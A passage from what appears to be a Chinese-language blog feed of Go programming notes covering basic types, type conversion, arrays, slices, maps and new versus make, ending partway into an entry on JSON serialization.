go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> c1 <span class="hljs-type">complex64</span><br><span class="hljs-keyword">var</span> c2 <span class="hljs-type">complex128</span><br>c1 = <span class="hljs-number">3</span> + <span class="hljs-number">5i</span><br>c2 = <span class="hljs-number">4</span> + <span class="hljs-number">8i</span><br>fmt.Printf(<span class="hljs-string">&quot;c1:%v, type: %T\n&quot;</span>, c1, c1)<span class="hljs-comment">// c1:(3+5i), type: complex64</span><br>fmt.Printf(<span class="hljs-string">&quot;c2:%v, type: %T\n&quot;</span>, c2, c2)<span class="hljs-comment">// c2:(4+8i), type: complex128</span><br></code></pre></td></tr></table></figure><ul><li><p><strong>布尔值</strong></p><ul><li>布尔型的值只可以是常量 <code>true</code> 或者 <code>false</code></li><li>布尔类型变量的零值为<code>false</code></li><li>布尔型不能参与数字运算，也不能与其他类型相互转换</li></ul></li><li><p><strong>字符串</strong></p><ul><li>字符串就是一串固定长度的字符连接起来的字符序列，由双引号包裹</li><li>字符串不可修改</li><li>字符串的零值是空字符串””</li><li>Go 语言的字符串的字节使用 UTF-8 编码标识 Unicode 文本</li><li>多行字符串的实现有两种方式：转译符号<code>\n</code>、反引号（键盘上Tab键上面那个键）</li><li>反引号间换行将被作为字符串中的换行，但是所有的转义字符均无效，文本将会原样输出。</li></ul></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">s1 := <span class="hljs-string">&quot;hello world&quot;</span><br>s2 := <span class="hljs-string">&quot;你好 世界&quot;</span><br><br>s3 := <span class="hljs-string">`第一行</span><br><span class="hljs-string">第二行</span><br><span class="hljs-string">第三行</span><br><span class="hljs-string">`</span><br></code></pre></td></tr></table></figure><ul><li><p>字符串本质是由字符组成，</p><ul><li><p>字符由单引号包裹</p></li><li><p>字符有两种类型：<code>byte</code>和<code>rune</code></p></li><li><p>字节<code>byte</code>用来处理ascii码表中的字符</p></li><li><p>符文<code>rune</code>来处理其他字符，如汉子。日文等</p></li><li><p>字符存储的本质所以数字：<code>byte</code>等于<code>int8</code>，<code>rune</code>等于<code>int32</code></p></li></ul></li></ul><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><ul><li>Go语言中没有隐式类型转换，类型转换都是显式的强制转换。</li><li>强制类型转换只能在两个类型之间支持相互转换的时候使用。</li><li>注意：浮点数转整型时，小数点后的数据会丢失</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>n1 := <span class="hljs-number">10</span><br>n2 := <span class="hljs-number">1.2</span><br>    n3 := <span class="hljs-type">float64</span>(n1) + n2<span class="hljs-comment">// 强制将int -&gt; float64,强制转换的方式 T(表达式)</span><br>fmt.Println(n3)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="容器型数据结构"><a href="#容器型数据结构" class="headerlink" title="容器型数据结构"></a>容器型数据结构</h2><p>代表：数组(Array)、切片(Slice)、映射(Map)</p><h3 id="数组Array"><a href="#数组Array" class="headerlink" title="数组Array"></a>数组Array</h3><ul><li>数组是一个由<strong>固定长度</strong>的<strong>相同类型</strong>元素组成的序列。</li><li>数组一旦确定，数组的长度就不能再改变。</li><li>类似python的元组</li></ul><p>声明数组</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> 数组名 [长度]元素类型<br><span class="hljs-comment">// var是关键字</span><br><span class="hljs-comment">// 数组名和普通的变量名遵循相同的名分规范和风格</span><br><span class="hljs-comment">// []，内的数字表示该数组可以存放元素的个数，及数组的长度</span><br><span class="hljs-comment">// 元素类型，数组内存放元素的类型，一个数组内元素的类型必须一致</span><br></code></pre></td></tr></table></figure><p>数组的零值</p><ul><li>数组是值类型，所以数组的零值是对应元素零值的集合</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> nums [<span class="hljs-number">3</span>]<span class="hljs-type">int</span><br><br>fmt.Println(nums)<span class="hljs-comment">// 输出： [0 0 0]</span><br></code></pre></td></tr></table></figure><p>数组的类型</p><ul><li>数组的类型：<code>[数组长度元素类型</code></li><li>数组的长度是类型的一部分，长度不同的两个数组，类型不一样</li><li>打印数组类型：<code>fmt.Printf(&quot;%T&quot;, nums)</code></li></ul><p>数组的长度</p><ul><li>数组长度：就是数组内元素的个数</li><li>查看数组长度：内置函数<code>len</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> nums = [<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<span class="hljs-comment">// 长度为3的数组</span><br>fmt.Println(<span class="hljs-built_in">len</span>(nums))<span class="hljs-comment">// 输出3</span><br></code></pre></td></tr></table></figure><p>数组的取值方式</p><ul><li>通过索引访问数组中的每个元素</li><li>索引从数组0开始，到数组长度减1位置</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> nums [<span class="hljs-number">5</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;<br>nums[<span class="hljs-number">0</span>]<span class="hljs-comment">// 数组第一个元素</span><br>nums[<span class="hljs-number">1</span>]<span class="hljs-comment">// 数组第二个元素</span><br>nums[<span class="hljs-number">4</span>]<span class="hljs-comment">// 数组最后一个元素</span><br>nums[<span class="hljs-number">5</span>]<span class="hljs-comment">// 报错：索引值越界</span><br></code></pre></td></tr></table></figure><p>数组赋值初始化</p><ul><li>类比变量的赋值和初始化</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> nums = [<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<span class="hljs-comment">// 类型推导</span><br>nums := [<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<span class="hljs-comment">// 简短式</span><br></code></pre></td></tr></table></figure><ul><li>指定位置赋值</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">nums := [<span class="hljs-number">5</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>:<span class="hljs-number">10</span>, <span class="hljs-number">3</span>: <span class="hljs-number">30</span>&#125;<br></code></pre></td></tr></table></figure><ul><li>自动赋值</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">nums := [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br></code></pre></td></tr></table></figure><p>数组长度</p><ul><li>通过内置函数：<code>len</code></li></ul><p>遍历数组</p><ul><li>使用for循环</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> i:=<span class="hljs-number">0</span>; i&lt;<span class="hljs-built_in">len</span>(nums); i++&#123;<br>    fmt.Println(nums[i])<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>使用range语句</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> index, value := <span class="hljs-keyword">range</span> nums&#123;<br>    fmt.Print(index, value)<br>&#125;<br><span class="hljs-comment">// index是索引，value是元素值; 不想要的可以通过 _ 接收</span><br></code></pre></td></tr></table></figure><h3 id="切片Slice"><a href="#切片Slice" class="headerlink" title="切片Slice"></a>切片Slice</h3><ul><li>数组的长度是固定的，不支持扩容，使用起来不方便</li><li>数组是值类型，当参数传给函数时值拷贝，无法通过函数修改数组元素</li></ul><p>切片概念:</p><ul><li>切片是一组相同类型元素的的序列，可以修改长度，使用灵活，自动扩容。</li><li>切片是对数组的一个连续片段的引用，所以切片是一个引用类型。</li></ul><p>声明切片</p><ul><li>基于数组声明一个切片</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">nums := [<span class="hljs-number">5</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;<br><br>nums_slice := nums[<span class="hljs-number">1</span>:<span class="hljs-number">3</span>]<span class="hljs-comment">// 左闭右开区间,</span><br>fmt.Println(nums_slice)<span class="hljs-comment">// [2,3]</span><br></code></pre></td></tr></table></figure><ul><li>其实位置和结束位置都不能为负数，都可以省略</li></ul><p>切片的类型<code>[]元素类型</code></p><p><strong>三大特征</strong></p><ul><li>切片内部结构包含：<strong>地址</strong>、<strong>大小</strong>、<strong>容量</strong></li><li>地址：切片底层是对数组的封装，地址就是底层数组的指针</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">nums := [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;<br>numsSlice := nums[:]<br><br>fmt.Printf(<span class="hljs-string">&quot;%p\n&quot;</span>, &amp;nums)<span class="hljs-comment">// 0xc00000c2d0</span><br>fmt.Printf(<span class="hljs-string">&quot;%p\n&quot;</span>, numsSlice)<span class="hljs-comment">// 0xc00000c2d0</span><br></code></pre></td></tr></table></figure><ul><li>大小：切片内元素的数量，内置方法<code>len</code></li><li>容量：切片最多可以放多少个元素，内置方法<code>cap</code></li></ul><p>切片的零值 nil</p><p>切片扩容</p><ul><li>使用内置函数给切片添加元素：<code>append</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">b := [<span class="hljs-number">10</span>]&#123;&#125;[:]<br>a = <span class="hljs-built_in">append</span>(a, <span class="hljs-number">1</span>)<br>a = <span class="hljs-built_in">append</span>(a, <span class="hljs-number">2</span>)<br>a = <span class="hljs-built_in">append</span>(a, b...)<span class="hljs-comment">// 将切片b内所有元素追加给a</span><br></code></pre></td></tr></table></figure><ul><li>当元素个数达到切片容量时，切片将自动扩容</li><li>扩容的规律：按容量的2倍进行扩展</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> numbers []<span class="hljs-type">int</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++ &#123;<br>    nums = <span class="hljs-built_in">append</span>(nums, i)<br>    fmt.Printf(<span class="hljs-string">&quot;len: %d  cap: %d pointer: %p\n&quot;</span>, <span class="hljs-built_in">len</span>(nums), <span class="hljs-built_in">cap</span>(nums), nums)<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>切片每一次扩容，底层关联的数组都会随之切换。</li><li>切片扩容的本质，是关联底层数组的切换。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := [<span class="hljs-number">2</span>]<span class="hljs-type">int</span>&#123;&#125;<br>b := a[:]<br>fmt.Printf(<span class="hljs-string">&quot;%p, %p\n&quot;</span>, &amp;a, b)<span class="hljs-comment">// 0xc00000a0c0, 0xc00000a0c0</span><br>b = <span class="hljs-built_in">append</span>(b, <span class="hljs-number">1</span>)<span class="hljs-comment">// 达到b的容量，发生扩容</span><br>fmt.Printf(<span class="hljs-string">&quot;%p, %p\n&quot;</span>, &amp;a, b)<span class="hljs-comment">// 0xc00000a0c0, 0xc0000101e0</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>创建切片的四种方式</code></p><p>基于数组</p><ul><li>基于数组切片一个切片</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">nums := [<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;<br>numSlice := nums[<span class="hljs-number">1</span>:<span class="hljs-number">3</span>]<br></code></pre></td></tr></table></figure><p>基于切片</p><ul><li>与基于数组创建类似，在切片上再切出一个切片</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">nums := [<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;<br>numSlice := nums[:]<br>numSlice2 := numSlice[<span class="hljs-number">1</span>:]<br></code></pre></td></tr></table></figure><p>直接声明切片</p><ul><li>直接使用切片的类型声明切片：<code>var sliceName []元素类型</code></li><li>如果仅声明一个切片，它是没有分配内存的。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> strSlice []<span class="hljs-type">string</span><span class="hljs-comment">// 声明字符串切片</span><br><span class="hljs-keyword">var</span> numSlice []<span class="hljs-type">int</span><span class="hljs-comment">// 声明整型切片</span><br><span class="hljs-keyword">var</span> numSlice2 = []<span class="hljs-type">int</span>&#123;&#125;<span class="hljs-comment">// 声明并初始化</span><br><br>fmt.Println(strSlice, numSlice, numSlice2)<span class="hljs-comment">// [] [] []</span><br>fmt.Println(<span class="hljs-built_in">len</span>(strSlice), <span class="hljs-built_in">len</span>(numSlice), <span class="hljs-built_in">len</span>(numSlice2))<span class="hljs-comment">// 0,0,0</span><br>fmt.Println(strSlice == <span class="hljs-literal">nil</span>)<span class="hljs-comment">// true</span><br>fmt.Println(numSlice == <span class="hljs-literal">nil</span>)<span class="hljs-comment">// true</span><br>fmt.Println(numSlice2 == <span class="hljs-literal">nil</span>)<span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p>make函数构造切片</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">sliceName := <span class="hljs-built_in">make</span>([]T, size, <span class="hljs-built_in">cap</span>)<span class="hljs-comment">// 格式</span><br>sliceTest := <span class="hljs-built_in">make</span>([]<span class="hljs-type">string</span>,<span class="hljs-number">10</span>)<br></code></pre></td></tr></table></figure><ul><li>使用内置函数make构造切片</li><li>创建的切片已经分配了内存，可以直接使用</li><li><code>T</code>是切片元素类型</li><li><code>size</code>是切片的长度</li><li><code>cap</code>是提前分配的元素数量，这个值设定后不影响 size，只是能提前分配空间，降低多次分配空间造成的性能问题。如果不指定则使用默认值。</li></ul><p>复制切片</p><ul><li>复制切片，也就拷贝切片，使用内置函数：<code>copy</code></li><li>将一个切片的元素对应位置拷贝给另一个切片，复制的元素个数以长度较小的切片为准。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">copy</span>(a, b)<span class="hljs-comment">// 将切片b的元素拷贝给切片a</span><br></code></pre></td></tr></table></figure><p>删除切片</p><ul><li>go没有提供专门删除切片内元素的方法，但可以利用切片的特性删除元素。</li><li>方式：移动切片的位置，append，copy等</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 方式1:</span><br>a = a[<span class="hljs-number">1</span>:]<span class="hljs-comment">// 删除切片a中的第一个元素</span><br>a = a[<span class="hljs-number">5</span>:]<span class="hljs-comment">// 删除切片a中前个元素</span><br><br><span class="hljs-comment">// append</span><br>a = <span class="hljs-built_in">append</span>(a[:<span class="hljs-number">0</span>], a[<span class="hljs-number">1</span>:])<span class="hljs-comment">// 删除切片a中的第一个元素</span><br>a = <span class="hljs-built_in">append</span>(a[:<span class="hljs-number">0</span>], a[<span class="hljs-number">5</span>:])<span class="hljs-comment">// 删除切片a中前个元素</span><br><br><span class="hljs-comment">// copy</span><br>a = a[:<span class="hljs-built_in">copy</span>(a, a[<span class="hljs-number">1</span>:])]<span class="hljs-comment">// 删除切片a中的第一个元素</span><br>a = a[:<span class="hljs-built_in">copy</span>(a, a[<span class="hljs-number">5</span>:])] <span class="hljs-comment">// 删除切片a中前个元素</span><br></code></pre></td></tr></table></figure><p>切片做函数的参数</p><p>切片是引用类型</p><ul><li><p>切片因为没有长度限制，所以方便做函数参数。</p></li><li><p>切片做函数参数是引用传递，修改形参将影响实参。</p></li><li><p>注意：当切片发生扩容时，则对切片做的修改就不再影响原底层数组。</p></li></ul><h3 id="映射map"><a href="#映射map" class="headerlink" title="映射map"></a>映射map</h3><ul><li>Go语言中 map（又叫映射）是一种特殊的数据类型：一种键(key)值(value)对组成的无序集合.</li><li>map按照key可以快速查找到value</li><li>key是字符串或者数字，value可以是任意数据类型，在一个map中通常key和value的类型固定</li><li>map支持扩容</li><li>map是引用类型</li></ul><p>声明map：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> mapName <span class="hljs-keyword">map</span>[keyType]valueType<br></code></pre></td></tr></table></figure><ul><li>这种方式声明的map是没有长度，未初始化的map零值是<code>nil</code></li></ul><p>赋值map</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">map1 = <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-string">&quot;class1&quot;</span>:<span class="hljs-number">10</span>, <span class="hljs-string">&quot;class2&quot;</span>:<span class="hljs-number">50</span>&#125;<br><br>map1[<span class="hljs-string">&quot;class3&quot;</span>] = <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>长度和容量</p><ul><li><p>获取长度：<code>len</code></p></li><li><p>获取容量：<code>cap</code></p></li><li><p>达到最大容量时将自动扩容，一般会预扩容，避免动态扩容时的性能损耗。</p></li></ul><p>make创建map</p><ul><li>使用make创建map，获取一个map对象</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">map1 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>)<span class="hljs-comment">// 预扩容为10</span><br></code></pre></td></tr></table></figure><p>map的长度和容量</p><p>内置函数：<code>len</code>和<code>cap</code></p><p>拿键取值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">fmt.Println(map1[<span class="hljs-string">&quot;cleas&quot;</span>])<br></code></pre></td></tr></table></figure><p>增加键值对</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">map1 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>)<br><br>map1[<span class="hljs-string">&quot;class1&quot;</span>] = <span class="hljs-number">50</span><span class="hljs-comment">// 增加键值对</span><br></code></pre></td></tr></table></figure><p>修改键值对</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">map1[<span class="hljs-string">&quot;class1&quot;</span>] = <span class="hljs-number">59</span><span class="hljs-comment">// 修改键值对</span><br></code></pre></td></tr></table></figure><p>删除键值对</p><ul><li>使用内置方法：<code>delete</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">delete</span>(map1, <span class="hljs-string">&quot;class1&quot;</span>)<span class="hljs-comment">// 键不存在时，不操作，不报错</span><br></code></pre></td></tr></table></figure><p>清空map</p><ul><li>没有专门的清空map的方法：清空就是重新make一个</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">a := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>)<br>a[<span class="hljs-string">&quot;class1&quot;</span>] = <span class="hljs-number">50</span><br>a[<span class="hljs-string">&quot;class2&quot;</span>] = <span class="hljs-number">60</span><br><br>a = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-number">10</span><span class="hljs-comment">// 清空map</span><br></code></pre></td></tr></table></figure><p>map是引用类型，做函数参数修改形参将影响实参</p><h1 id="new和make的区别"><a href="#new和make的区别" class="headerlink" title="new和make的区别"></a>new和make的区别</h1><h3 id="相同点"><a href="#相同点" class="headerlink" title="相同点"></a>相同点</h3><ul><li>new 和 make 是两个内置函数，都是用来创建并分配类型的内存。</li></ul><h3 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h3><ul><li><strong>new一般用在值类型，make用在引用类型。</strong></li><li>new只接受一个参数：类型，返回该类型的指针，同时分配的内存会置为该类型的零值；</li><li>make只用于 chan、map 以及 slice 的内存创建，而且它返回的类型就是这三个类型本身，而不是他们的指针类型。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// new</span><br><span class="hljs-keyword">var</span> a []<span class="hljs-type">int</span><span class="hljs-comment">// a == nil</span><br>b := <span class="hljs-built_in">new</span>([]<span class="hljs-type">int</span>)<span class="hljs-comment">// b != nil</span><br><br><span class="hljs-comment">// make</span><br><span class="hljs-keyword">var</span> a <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span><span class="hljs-comment">// a == nil</span><br>b := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>)<span class="hljs-comment">// b != nil</span><br></code></pre></td></tr></table></figure><h3 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h3><ul><li>new 只分配内存，而 make 只能用于 slice、map 和 channel 的初始化。</li></ul>]]></content>
    
    
    <categories>
      
      <category>Golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>go</tag>
      
      <tag>编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【Golang】go语言之json、YAML的序列化和反序列化</title>
    <link href="/2023/12/06/803go%E8%AF%AD%E8%A8%80json%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/12/06/803go%E8%AF%AD%E8%A8%80json%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="11-1-json序列化"><a href="#11-1-json序列化" class="headerlink" title="11.1 json序列化"></a>11.1 json序列化</h1><p>Go语言中的序列化和反序列化是一种解码<strong>思路</strong></p><p>可以将结构体进行序列化为<strong>JSON字符串格式</strong>，</p><p><code>注意：不是将类型转化为JSON，go语言没有JSON格式类型，</code></p><p>是将数据，转化为 JSON格式风格的数据，供其他语言使用，</p><p>比如说，python中，也没有json这种数据格式，把一串json导入到Python，打印它的类型，打印出来就是string字符串类型，将json转化成字典，就是将字符串转成字典</p><p>带入到go语言中也是一样的概念，只是go语言可以通过结构体去转化成json(序列化)，变成一种键值对的格式（也有不是键值对格式的json）</p><p>go语言序列化（结构体转json）和反序列化的实现方式：通过json.Marshal(person) person就是结构体实例化的数据，json.Unmarshal(jsondata)就是反序列化（结构体转json）</p><p>结构体转JSON</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;encoding/json&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> Myaccount <span class="hljs-keyword">struct</span> &#123;<br>Name   <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;name&quot;`</span><br>PWD    <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;pwd&quot;`</span><br>Amount <span class="hljs-type">int</span>    <span class="hljs-string">`json:&quot;amount&quot;`</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>account := Myaccount&#123;<span class="hljs-string">&quot;and&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>, <span class="hljs-number">18</span>&#125;<br>fmt.Println(<span class="hljs-string">&quot;打印一下：&quot;</span>, account) <span class="hljs-comment">// 打印一下： &#123;and 123 18&#125;</span><br><span class="hljs-comment">// 序列化方法</span><br>data1, _ := json.Marshal(account)<br>    fmt.Println(<span class="hljs-string">&quot;序列化后的data1:&quot;</span>, <span class="hljs-type">string</span>(data1)) <span class="hljs-comment">// 序列化后的data1: &#123;&quot;name&quot;:&quot;and&quot;,&quot;pwd&quot;:&quot;123&quot;,&quot;amount&quot;:18&#125;</span><br>fmt.Printf(<span 